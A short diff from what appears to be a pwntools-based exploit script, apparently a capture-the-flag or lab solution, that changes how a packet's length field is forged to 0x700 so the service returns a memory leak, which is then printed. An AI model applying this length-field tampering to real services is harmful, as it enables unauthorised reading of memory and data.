@@ -48,7 +48,7 @@ def main():
     packet_len = 7
 
     def altered_len(length):
-        return packet[0:8] + p32(packet_len + length) + packet[12:]
+        return packet[0:8] + p32(length) + packet[12:]
 
     leak = r.decode(altered_len(0x700))
     print(leak)
